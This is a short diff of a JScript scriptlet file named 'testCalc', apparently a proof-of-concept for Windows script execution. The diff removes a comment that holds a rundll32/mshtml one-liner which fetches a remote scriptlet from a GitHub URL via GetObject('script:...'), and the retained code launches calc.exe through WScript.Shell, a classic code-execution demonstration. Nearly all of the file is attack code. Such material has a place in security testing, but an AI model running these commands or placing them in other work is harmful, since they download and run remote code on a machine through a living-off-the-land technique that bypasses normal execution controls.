@@ -4,7 +4,6 @@
 <component id="testCalc">
 
 <script language="JScript">
-// rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/eddiechu/eddiechu.github.io/main/rundll32.txt")
 <![CDATA[
 var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
 ]]>
